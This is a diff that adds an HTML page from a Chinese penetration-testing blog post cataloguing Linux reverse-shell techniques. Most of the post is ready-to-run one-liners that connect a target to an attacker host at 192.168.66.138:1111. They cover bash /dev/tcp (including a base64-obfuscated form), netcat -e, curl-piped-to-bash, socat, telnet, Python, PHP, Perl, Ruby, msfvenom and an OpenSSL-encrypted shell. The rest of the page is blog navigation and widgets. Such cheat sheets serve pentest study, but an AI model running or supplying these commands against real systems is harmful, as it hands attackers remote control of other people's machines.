@@ -1,0 +1,993 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+  <head>
+  <meta charset="UTF-8">
+  <meta 
+    name="viewport"
+    content="width=device-width, initial-scale=1.0, minimum-scale=1.0">
+  <meta 
+    http-equiv="X-UA-Compatible" 
+    content="ie=edge">
+  <meta 
+    name="theme-color" 
+    content="#fff" 
+    id="theme-color">
+  <meta 
+    name="description" 
+    content="Chen">
+  <link 
+    rel="icon" 
+    href="/img/favicon.png">
+  <title>反弹shell归纳</title>
+  
+    
+      <meta 
+        property="og:title" 
+        content="反弹shell归纳">
+    
+    
+      <meta 
+        property="og:url" 
+        content="https://www.zerochen.top/article/%E5%8F%8D%E5%BC%B9shell%E5%BD%92%E7%BA%B3/index.html">
+    
+    
+      <meta 
+        property="og:img" 
+        content="/img/logo.png">
+    
+    
+    
+      <meta 
+        property="og:type" 
+        content="article">
+      <meta 
+        property="og:article:published_time" 
+        content="2021-06-20">
+      <meta 
+        property="og:article:modified_time" 
+        content="2021-07-21">
+      <meta 
+        property="og:article:author" 
+        content="沉墨">
+      
+        
+          <meta 
+            property="og:article:tag" 
+            content="反弹shell">
+        
+      
+    
+  
+  <script>
+    function loadScript(url, cb) {
+      var script = document.createElement('script');
+      script.src = url;
+      if (cb) script.onload = cb;
+      script.async = true;
+      document.body.appendChild(script);
+    }
+    function loadCSS(href, data, attr) {
+      var sheet = document.createElement('link');
+      sheet.ref = 'stylesheet';
+      sheet.href = href;
+      sheet.dataset[data] = attr;
+      document.head.appendChild(sheet);
+    }
+    function changeCSS(cssFile, data, attr) {
+      var oldlink = document.querySelector(data);
+      var newlink = document.createElement("link");
+      newlink.setAttribute("rel", "stylesheet");
+      newlink.setAttribute("href", cssFile);
+      newlink.dataset.prism = attr;
+      document.head.replaceChild(newlink, oldlink);
+    }
+  </script>
+  
+    
+  
+  <script>
+    // control reverse button
+    var reverseDarkList = {
+      dark: 'light',
+      light: 'dark'
+    };
+    var themeColor = {
+      dark: '#1c1c1e',
+      light: '#fff'
+    }
+    // get the data of css prefers-color-scheme
+    var getCssMediaQuery = function() {
+      return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
+    };
+    // reverse current darkmode setting function
+    var reverseDarkModeSetting = function() {
+      var setting = localStorage.getItem('user-color-scheme');
+      if(reverseDarkList[setting]) {
+        setting = reverseDarkList[setting];
+      } else if(setting === null) {
+        setting = reverseDarkList[getCssMediaQuery()];
+      } else {
+        return;
+      }
+      localStorage.setItem('user-color-scheme', setting);
+      return setting;
+    };
+    // apply current darkmode setting
+  </script>
+  
+    <script>
+      var setDarkmode = function(mode) {
+      var setting = mode || localStorage.getItem('user-color-scheme');
+      if(setting === getCssMediaQuery()) {
+        document.documentElement.removeAttribute('data-user-color-scheme');
+        localStorage.removeItem('user-color-scheme');
+        document.getElementById('theme-color').content = themeColor[setting];
+        document.getElementById('theme-color').dataset.mode = setting;
+      } else if(reverseDarkList[setting]) {
+        document.documentElement.setAttribute('data-user-color-scheme', setting);
+        document.getElementById('theme-color').content = themeColor[setting];
+        document.getElementById('theme-color').dataset.mode = setting;
+      } else {
+        document.documentElement.removeAttribute('data-user-color-scheme');
+        localStorage.removeItem('user-color-scheme');
+        document.getElementById('theme-color').content = themeColor[getCssMediaQuery()];
+        document.getElementById('theme-color').dataset.mode = getCssMediaQuery();
+      }
+    };
+    setDarkmode();
+    </script>
+  
+  
+  <link rel="preload" href="//at.alicdn.com/t/font_1946621_i1kgafibvw.css" as="style" >
+  <link rel="preload" href="//at.alicdn.com/t/font_1952792_89b4ac4k4up.css" as="style" >
+  
+  
+    <link rel="preload" href="/js/lib/lightbox/baguetteBox.min.js" as="script">
+    <link rel="preload" href="/js/lib/lightbox/baguetteBox.min.css" as="style" >
+  
+  
+    <link rel="preload" href="/js/lib/lozad.min.js" as="script">
+  
+  
+  
+  
+  
+    
+    <link rel="prefetch" href="//unpkg.com/valine/dist/Valine.min.js" as="script">
+  
+  
+  
+  <link rel="stylesheet" href="/css/main.css">
+  
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1946621_i1kgafibvw.css">
+  
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1952792_89b4ac4k4up.css">
+  
+    <link rel="stylesheet" href="/js/lib/lightbox/baguetteBox.min.css">
+  
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+  <body>
+    <div class="wrapper">
+       
+      <nav class="navbar">
+  <div class="navbar-logo">
+    <span class="navbar-logo-main">
+      
+        <img 
+          class="navbar-logo-img" 
+          src="/img/favicon.png" 
+          alt="blog logo">
+      
+      <span class="navbar-logo-dsc">沉墨的小小技术圈</span>
+    </span>
+  </div>
+  <div class="navbar-menu">
+    
+      <a 
+        href="/" 
+        class="navbar-menu-item">
+        
+          首页
+        
+      </a>
+    
+      <a 
+        href="/archives" 
+        class="navbar-menu-item">
+        
+          归档
+        
+      </a>
+    
+      <a 
+        href="/tags" 
+        class="navbar-menu-item">
+        
+          标签
+        
+      </a>
+    
+      <a 
+        href="/categories" 
+        class="navbar-menu-item">
+        
+          分类
+        
+      </a>
+    
+      <a 
+        href="/about" 
+        class="navbar-menu-item">
+        
+          关于
+        
+      </a>
+    
+      <a 
+        href="/links" 
+        class="navbar-menu-item">
+        
+          友链
+        
+      </a>
+    
+    <a 
+      class="navbar-menu-item darknavbar" 
+      id="dark">
+      <i class="iconfont icon-weather"></i>
+    </a>
+    <a 
+      class="navbar-menu-item searchnavbar" 
+      id="search">
+      <i 
+        class="iconfont icon-search" 
+        style="font-size: 1.2rem; font-weight: 400;">
+      </i>
+    </a>
+  </div>
+</nav> 
+      
+      <div 
+        id="local-search" 
+        style="display: none">
+        <input
+          class="navbar-menu-item"
+          id="search-input"
+          placeholder="请输入搜索内容..." />
+        <div id="search-content"></div>
+      </div>
+      
+      <div class="section-wrap">
+        <div class="container">
+          <div class="columns">
+            <main class="main-column">
+<article class="card card-content">
+  <header>
+    <h1 class="post-title">
+      反弹shell归纳
+    </h1>
+  </header>
+  <div class="post-meta post-show-meta">
+    <time datetime="2021-06-20T06:36:45.000Z">
+      <i 
+        class="iconfont icon-calendar" 
+        style="margin-right: 2px;">
+      </i>
+      <span>2021-06-20</span>
+    </time>
+    
+      <span class="dot"></span>
+      
+        <a 
+          href="/categories/Web%E6%B8%97%E9%80%8F/" 
+          class="post-meta-link">
+          Web渗透
+        </a>
+      
+    
+    
+      <span class="dot"></span>
+      <span>1.6k 字</span>
+    
+  </div>
+  
+    <div 
+      class="post-meta post-show-meta" 
+      style="margin-top: -10px;">
+      <div style="display: flex; align-items: center;">
+        <i 
+          class="iconfont icon-biaoqian" 
+          style="margin-right: 2px; font-size: 1.15rem;">
+        </i>
+        
+          
+          <a 
+            href="/tags/%E5%8F%8D%E5%BC%B9shell/" 
+            class="post-meta-link">
+            反弹shell
+          </a>
+        
+      </div>
+    </div>
+  
+  </header>
+  <div 
+    id="section" 
+    class="post-content">
+    <h1 id="Linux反弹shell归纳"><a href="#Linux反弹shell归纳" class="headerlink" title="Linux反弹shell归纳"></a>Linux反弹shell归纳</h1><p>注意：若是实战环境，反弹shell目标需要为公网ip。（搭服务器）</p>
+<h2 id="Bash反弹shell"><a href="#Bash反弹shell" class="headerlink" title="Bash反弹shell"></a>Bash反弹shell</h2><p>bash重定向，优先使用。</p>
+<pre class="highlight"><span class="line">bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.66.138/1111 0&gt;&amp;1&quot;</span><br><span class="line"># bash -i &gt;&amp; /dev/tcp/攻击机IP/攻击机端口 0&gt;&amp;1</span><br></pre>
+
+<p>以下是针对Bash反弹一句话进行了拆分说明：</p>
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>命令详解</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>bash -i</td>
+<td>产生一个bash交互环境。</td>
+</tr>
+<tr>
+<td>&gt;&amp;</td>
+<td>将联合符号前面的内容与后面相结合，然后一起重定向给后者。</td>
+</tr>
+<tr>
+<td>/dev/tcp/47.xxx.xxx.72/2333</td>
+<td>Linux环境中所有的内容都是以文件的形式存在的，其实大家一看见这个内容就能明白，就是让目标主机与攻击机47.xxx.xxx.72的2333端口建立一个tcp连接。</td>
+</tr>
+<tr>
+<td>0&gt;&amp;1</td>
+<td>将标准输入与标准输出的内容相结合，然后重定向给前面标准输出的内容。</td>
+</tr>
+</tbody></table>
+<p>Bash反弹一句完整的解读过程就是：</p>
+<p>Bash产生了一个交互环境和本地主机主动发起与攻击机2333端口建立的连接（即TCP 2333会话连接）相结合，然后在重定向个TCP 2333会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个Bash反弹环境。</p>
+<p>1、开启本地监听</p>
+<pre class="highlight"><span class="line">nc -lvvp 1111</span><br></pre>
+
+<p>2、目标机反弹连接攻击机</p>
+<pre class="highlight"><span class="line">bash -c &quot;bash -i &gt;&amp;  /dev/tcp/192.168.66.138/1111 0&gt;&amp;1&quot;</span><br></pre>
+
+
+
+<h5 id="注意：利用工具写入反弹shell时，命令如下："><a href="#注意：利用工具写入反弹shell时，命令如下：" class="headerlink" title="注意：利用工具写入反弹shell时，命令如下："></a>注意：利用工具写入反弹shell时，命令如下：</h5><p>bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjY2LjEzOC8xMTExIDA+JjE=}|{base64,-d}|{bash,-i}</p>
+<p>其中，加密部分为bash -i &gt;&amp;  /dev/tcp/192.168.66.138/1111 0&gt;&amp;1的base64编码。IP、端口修改时需重新进行base64加密</p>
+<h2 id="netcat反弹shell"><a href="#netcat反弹shell" class="headerlink" title="netcat反弹shell"></a>netcat反弹shell</h2><p>1、linux默认自带netcat工具，但是反弹shell功能-e参数通常被阉割，需要手动下载二进制安装包。</p>
+<pre class="highlight"><span class="line">wget https://nchc.dl.sourceforge.net/project/netcat/netcat/0.7.1/netcat-0.7.1.tar.gz</span><br><span class="line">tar -xvzf netcat-0.7.1.tar.gz</span><br><span class="line">./configure</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line">make clean</span><br></pre>
+
+<p>2、攻击机开启本地监听</p>
+<pre class="highlight"><span class="line">netcat -lvvp 1111</span><br></pre>
+
+<p>3、目标机主动连接攻击机</p>
+<pre class="highlight"><span class="line">netcat 192.168.66.138 1111 -e /bin/bash</span><br><span class="line"># netcat &lt;攻击机IP&gt; &lt;攻击机监听的端口&gt; -e /bin/bash</span><br></pre>
+
+
+
+
+
+<h2 id="Curl-Bash反弹shell"><a href="#Curl-Bash反弹shell" class="headerlink" title="Curl+Bash反弹shell"></a>Curl+Bash反弹shell</h2><p>借助Linux管道命令。</p>
+<p>1、在攻击者vps（公网）的web目录里面创建一个index文件（index.php或index.html），内容如下：</p>
+<pre class="highlight"><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.66.138/1111 0&gt;&amp;1</span><br></pre>
+
+<p>2、开启本地监听</p>
+<pre class="highlight"><span class="line">nc -lvvp 1111</span><br></pre>
+
+<p>3、在目标机器上执行如下代码，即可反弹shell</p>
+<pre class="highlight"><span class="line">curl 192.168.66.138|bash</span><br></pre>
+
+<p>curl IP | bash中的IP可以是任何形式（十进制、十六进制、八进制、二进制等）</p>
+<h2 id="Socat反弹shell"><a href="#Socat反弹shell" class="headerlink" title="Socat反弹shell"></a>Socat反弹shell</h2><p>1、安装</p>
+<pre class="highlight"><span class="line">apt-get install socat</span><br></pre>
+
+<p>2、攻击机开启本地监听</p>
+<pre class="highlight"><span class="line">socat TCP-LISTEN:1111 -</span><br><span class="line">或nc -lvvp 1111</span><br></pre>
+
+<p>3、目标机主动连接攻击机</p>
+<pre class="highlight"><span class="line">socat tcp-connect:192.168.66.138:1111 exec:&#x27;bash -li&#x27;,pty,stderr,setsid,sigint,sane</span><br></pre>
+
+
+
+
+
+<h2 id="Telnet反弹shell"><a href="#Telnet反弹shell" class="headerlink" title="Telnet反弹shell"></a>Telnet反弹shell</h2><p>当nc和/dev/tcp不可用时，且目标机和攻击机都开启telnet（23端口）服务时，可用telnet反弹shell。</p>
+<p>方法一：</p>
+<p>1、攻击机开启本地监听：</p>
+<pre class="highlight"><span class="line">nc -lvvp 1111</span><br></pre>
+
+<p>2、目标机主动连接攻击机</p>
+<pre class="highlight"><span class="line">mknod a p;telnet 192.168.66.138 1111 0&lt;a | /bin/bash 1&gt;a</span><br></pre>
+
+
+
+<p>方法二：</p>
+<p>1、攻击机开启两个本地监听：</p>
+<pre class="highlight"><span class="line">nc -lvvp 1111</span><br><span class="line">nc -lvvp 2222</span><br></pre>
+
+<p>2、目标机主动连接攻击机：</p>
+<p>telnet 192.168.66.138 1111 | /bin/bash | telnet 192.168.66.138 2222</p>
+<p>3、攻击机1111端口执行命令，2222端口回显命令</p>
+<h2 id="Python脚本反弹shell"><a href="#Python脚本反弹shell" class="headerlink" title="Python脚本反弹shell"></a>Python脚本反弹shell</h2><p>1、攻击机开启本地监听</p>
+<pre class="highlight"><span class="line">nc -lvvp 1111</span><br></pre>
+
+<p>2、目标机主动连接攻击机</p>
+<pre class="highlight"><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.66.138&quot;,1111));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre>
+
+
+
+
+
+<h2 id="PHP脚本反弹shell"><a href="#PHP脚本反弹shell" class="headerlink" title="PHP脚本反弹shell"></a>PHP脚本反弹shell</h2><p>1、攻击机开启本地监听</p>
+<pre class="highlight"><span class="line">nc -lvvp 1111</span><br></pre>
+
+<p>2、目标机主动连接攻击机：</p>
+<pre class="highlight"><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;192.168.66.138&quot;,1111);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br></pre>
+
+
+
+
+
+<h2 id="Perl脚本反弹shell（后缀-pl）"><a href="#Perl脚本反弹shell（后缀-pl）" class="headerlink" title="Perl脚本反弹shell（后缀.pl）"></a>Perl脚本反弹shell（后缀.pl）</h2><p>1、攻击机开启本地监听</p>
+<pre class="highlight"><span class="line">nc -lvvp 1111</span><br></pre>
+
+<p>2、目标机主动连接攻击机</p>
+<pre class="highlight"><span class="line">perl -e <span class="string">&#x27;use Socket;$i=&quot;192.168.66.138&quot;;$p=1111;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span></span><br></pre>
+
+
+
+
+
+<h2 id="Ruby脚本反弹shell（后缀-rb）"><a href="#Ruby脚本反弹shell（后缀-rb）" class="headerlink" title="Ruby脚本反弹shell（后缀.rb）"></a>Ruby脚本反弹shell（后缀.rb）</h2><p>1、攻击机开启本地监听</p>
+<pre class="highlight"><span class="line">nc -lvvp 1111</span><br></pre>
+
+<p>2、目标机主动连接攻击机</p>
+<pre class="highlight"><span class="line">ruby -rsocket -e &#x27;c=TCPSocket.new(&quot;192.168.66.138&quot;,&quot;1111&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span><br><span class="line">或</span><br><span class="line">ruby -rsocket -e &#x27;exit if fork;c=TCPSocket.new(&quot;192.168.66.138&quot;,&quot;1111&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span><br></pre>
+
+
+
+
+
+<h2 id="Metasploit生成反弹shell"><a href="#Metasploit生成反弹shell" class="headerlink" title="Metasploit生成反弹shell"></a>Metasploit生成反弹shell</h2><p>1、自动生成反弹一句话</p>
+<pre class="highlight"><span class="line">msfvenom -p cmd/unix/reverse_python LHOST=192.168.66.138 LPORT=1111 -f raw</span><br></pre>
+
+<p>其中，cmd/unix/reverse_python为python类型反弹命令，其他类型直接更改_后缀即可，如cmd/unix/reverse_perl生成perl反弹shell</p>
+<p>2、将生成的反弹shell直接在目标机器上执行即可</p>
+<h2 id="OpenSSL反弹加密shell"><a href="#OpenSSL反弹加密shell" class="headerlink" title="OpenSSL反弹加密shell"></a>OpenSSL反弹加密shell</h2><p>1、攻击机生成自签名证书：（填写信息全部回车即可）</p>
+<pre class="highlight"><span class="line">openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes</span><br></pre>
+
+<p>2、在攻击机上使用OpenSSL监听一个端口</p>
+<pre class="highlight"><span class="line">openssl s_server -quiet -key key.pem -cert cert.pem -port 1111</span><br></pre>
+
+<p>3、在目标机上进行反弹shell</p>
+<pre class="highlight"><span class="line">mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect 192.168.66.138:1111 &gt; /tmp/s; rm /tmp/s</span><br></pre>
+
+
+
+
+
+<h2 id="反弹shell后获取模拟终端"><a href="#反弹shell后获取模拟终端" class="headerlink" title="反弹shell后获取模拟终端"></a>反弹shell后获取模拟终端</h2><p>上面所讲的各种方法获取的shell都不是一个标准的虚拟终端环境，它仅仅是一个标准输入。你会发现存在一个问题，就是即使我们获取了目标虚拟终端控制权限，但是往往会发现其交互性非常的差，回显信息与可交互性非常的差和不稳定，具体见情况有以下几个种。</p>
+<p>1、获取的虚拟终端没有交互性，我们想给添加的账号设置密码或执行sudo等命令，无法完成。</p>
+<p>2、标准的错误输出无法显示，无法正常使用vim等文本编辑器等。</p>
+<p>3、获取的目标主机的虚拟终端使用非常不稳定，很容易断开连接。</p>
+<p>若是无法完成正常交互，则需要使用python模拟终端设备，命令如下：</p>
+<pre class="highlight"><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre>
+
+
+  </div>
+  <div>
+    
+  </div>
+</article>
+<div class="nav">
+  
+    <div class="nav-item-prev">
+      <a 
+        href="/article/Windows%E5%A4%9A%E4%B8%AAJava%E7%8E%AF%E5%A2%83%E5%85%B1%E5%AD%98/" 
+        class="nav-link">
+        <i class="iconfont icon-left nav-prev-icon"></i>
+        <div>
+          <div class="nav-label">上一篇</div>
+          
+            <div class="nav-title">Windows多个Java环境共存 </div>
+          
+        </div>
+      </a>
+    </div>
+  
+  
+    <div class="nav-item-next">
+      <a 
+        href="/article/%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7%E5%B9%B6%E6%8F%90%E6%9D%83/" 
+        class="nav-link">
+        <div>
+          <div class="nav-label">下一篇</div>
+          
+            <div class="nav-title">添加用户并提权 </div>
+          
+        </div>
+        <i class="iconfont icon-right nav-next-icon"></i>
+      </a>
+    </div>
+  
+</div>
+
+  <div 
+    class="card card-content comment-card" 
+    style="margin-top: 16px;">
+    <div class="comment-card-title">评论</div>
+    
+  <div id="vcomments"></div>
+  
+  <script>
+    loadScript("//unpkg.com/valine/dist/Valine.min.js");
+    var oldLoadVa = window.onload;
+    window.onload = function () {
+      oldLoadVa && oldLoadVa();
+      new Valine({
+        el: '#vcomments',
+        appId: '2ShT4MB47jbSbE00Kn5TgK8j-gzGzoHsz',
+        appKey: 'eC6yijqvttNWfHdJogIgmhA4',
+        placeholder: 'Just go go',
+        path: window.location.pathname,
+        avatar: 'mp',
+        meta: ["nick","mail","link"],
+        pageSize: '10',
+        lang: '',
+        visitor: 'false',
+        highlight: true,
+        recordIP: false,
+        
+        
+        
+        enableQQ: 'false',
+        requiredFields: [],
+      });
+    };
+  </script>
+
+  </div>
+
+<div 
+  class="card card-content toc-card" 
+  id="mobiletoc">
+  <div class="toc-header">
+  <i 
+    class="iconfont icon-menu" 
+    style="padding-right: 2px;">
+  </i>目录
+</div>
+<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Linux%E5%8F%8D%E5%BC%B9shell%E5%BD%92%E7%BA%B3"><span class="toc-text">Linux反弹shell归纳</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Bash%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">Bash反弹shell</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%EF%BC%9A%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7%E5%86%99%E5%85%A5%E5%8F%8D%E5%BC%B9shell%E6%97%B6%EF%BC%8C%E5%91%BD%E4%BB%A4%E5%A6%82%E4%B8%8B%EF%BC%9A"><span class="toc-text">注意：利用工具写入反弹shell时，命令如下：</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#netcat%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">netcat反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Curl-Bash%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">Curl+Bash反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Socat%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">Socat反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Telnet%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">Telnet反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Python%E8%84%9A%E6%9C%AC%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">Python脚本反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP%E8%84%9A%E6%9C%AC%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">PHP脚本反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Perl%E8%84%9A%E6%9C%AC%E5%8F%8D%E5%BC%B9shell%EF%BC%88%E5%90%8E%E7%BC%80-pl%EF%BC%89"><span class="toc-text">Perl脚本反弹shell（后缀.pl）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ruby%E8%84%9A%E6%9C%AC%E5%8F%8D%E5%BC%B9shell%EF%BC%88%E5%90%8E%E7%BC%80-rb%EF%BC%89"><span class="toc-text">Ruby脚本反弹shell（后缀.rb）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Metasploit%E7%94%9F%E6%88%90%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">Metasploit生成反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#OpenSSL%E5%8F%8D%E5%BC%B9%E5%8A%A0%E5%AF%86shell"><span class="toc-text">OpenSSL反弹加密shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell%E5%90%8E%E8%8E%B7%E5%8F%96%E6%A8%A1%E6%8B%9F%E7%BB%88%E7%AB%AF"><span class="toc-text">反弹shell后获取模拟终端</span></a></li></ol></li></ol>
+</div></main>
+            <aside class="left-column">
+              
+              <div class="card card-author">
+                
+  <img 
+    src="/img/logo.png" 
+    class="author-img" 
+    alt="author avatar">
+
+<p class="author-name">沉墨</p>
+<p class="author-description">努力成为一个Python脚本小子</p>
+<div class="author-message">
+  <a 
+    class="author-posts-count" 
+    href="/archives">
+    <span>26</span>
+    <span>文章</span>
+  </a>
+  <a 
+    class="author-categories-count" 
+    href="/categories">
+    <span>8</span>
+    <span>分类</span>
+  </a>
+  <a 
+    class="author-tags-count" 
+    href="/tags">
+    <span>26</span>
+    <span>标签</span>
+  </a>
+</div>
+
+              </div>
+               <div class="sticky-tablet">
+  
+  
+    <article class="display-when-two-columns spacer">
+      <div class="card card-content toc-card">
+        <div class="toc-header">
+  <i 
+    class="iconfont icon-menu" 
+    style="padding-right: 2px;">
+  </i>目录
+</div>
+<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Linux%E5%8F%8D%E5%BC%B9shell%E5%BD%92%E7%BA%B3"><span class="toc-text">Linux反弹shell归纳</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Bash%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">Bash反弹shell</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%EF%BC%9A%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7%E5%86%99%E5%85%A5%E5%8F%8D%E5%BC%B9shell%E6%97%B6%EF%BC%8C%E5%91%BD%E4%BB%A4%E5%A6%82%E4%B8%8B%EF%BC%9A"><span class="toc-text">注意：利用工具写入反弹shell时，命令如下：</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#netcat%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">netcat反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Curl-Bash%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">Curl+Bash反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Socat%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">Socat反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Telnet%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">Telnet反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Python%E8%84%9A%E6%9C%AC%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">Python脚本反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP%E8%84%9A%E6%9C%AC%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">PHP脚本反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Perl%E8%84%9A%E6%9C%AC%E5%8F%8D%E5%BC%B9shell%EF%BC%88%E5%90%8E%E7%BC%80-pl%EF%BC%89"><span class="toc-text">Perl脚本反弹shell（后缀.pl）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ruby%E8%84%9A%E6%9C%AC%E5%8F%8D%E5%BC%B9shell%EF%BC%88%E5%90%8E%E7%BC%80-rb%EF%BC%89"><span class="toc-text">Ruby脚本反弹shell（后缀.rb）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Metasploit%E7%94%9F%E6%88%90%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">Metasploit生成反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#OpenSSL%E5%8F%8D%E5%BC%B9%E5%8A%A0%E5%AF%86shell"><span class="toc-text">OpenSSL反弹加密shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell%E5%90%8E%E8%8E%B7%E5%8F%96%E6%A8%A1%E6%8B%9F%E7%BB%88%E7%AB%AF"><span class="toc-text">反弹shell后获取模拟终端</span></a></li></ol></li></ol>
+      </div>
+    </article>
+  
+  
+  <article class="card card-content categories-widget">
+    <div class="categories-card">
+  <div class="categories-header">
+    <i 
+      class="iconfont icon-fenlei" 
+      style="padding-right: 2px;">
+    </i>分类
+  </div>
+  <div class="categories-list">
+    
+      <a href="/categories/Web%E6%B8%97%E9%80%8F/">
+        <div class="categories-list-item">
+          Web渗透
+          <span class="categories-list-item-badge">5</span>
+        </div>
+      </a>
+    
+      <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+        <div class="categories-list-item">
+          漏洞复现
+          <span class="categories-list-item-badge">4</span>
+        </div>
+      </a>
+    
+      <a href="/categories/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">
+        <div class="categories-list-item">
+          环境搭建
+          <span class="categories-list-item-badge">6</span>
+        </div>
+      </a>
+    
+      <a href="/categories/%E9%99%84%E5%8A%A0/">
+        <div class="categories-list-item">
+          附加
+          <span class="categories-list-item-badge">2</span>
+        </div>
+      </a>
+    
+      <a href="/categories/%E7%BC%96%E7%A8%8B%E5%9F%BA%E7%A1%80/">
+        <div class="categories-list-item">
+          编程基础
+          <span class="categories-list-item-badge">1</span>
+        </div>
+      </a>
+    
+      <a href="/categories/Linux/">
+        <div class="categories-list-item">
+          Linux
+          <span class="categories-list-item-badge">2</span>
+        </div>
+      </a>
+    
+      <a href="/categories/Python/">
+        <div class="categories-list-item">
+          Python
+          <span class="categories-list-item-badge">4</span>
+        </div>
+      </a>
+    
+      <a href="/categories/Windows/">
+        <div class="categories-list-item">
+          Windows
+          <span class="categories-list-item-badge">1</span>
+        </div>
+      </a>
+    
+  </div>
+</div>
+  </article>
+  
+  <article class="card card-content tags-widget">
+    <div class="tags-card">
+  <div class="tags-header">
+    <i 
+      class="iconfont icon-biaoqian" 
+      style="padding-right: 2px;">
+    </i>热门标签
+  </div>
+  <div class="tags-list">
+    
+      <a 
+        href="/tags/%E9%9A%8F%E8%AE%B0/" 
+        title="随记">
+        <div class="tags-list-item">随记</div>
+      </a>
+    
+      <a 
+        href="/tags/hexo%E5%8D%9A%E5%AE%A2/" 
+        title="hexo博客">
+        <div class="tags-list-item">hexo博客</div>
+      </a>
+    
+      <a 
+        href="/tags/%E7%9B%B4%E6%92%AD%E6%8E%A8%E6%B5%81%E5%B9%B3%E5%8F%B0/" 
+        title="直播推流平台">
+        <div class="tags-list-item">直播推流平台</div>
+      </a>
+    
+      <a 
+        href="/tags/Nginx%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" 
+        title="Nginx环境搭建">
+        <div class="tags-list-item">Nginx环境搭建</div>
+      </a>
+    
+      <a 
+        href="/tags/%E5%8F%8D%E5%BC%B9shell/" 
+        title="反弹shell">
+        <div class="tags-list-item">反弹shell</div>
+      </a>
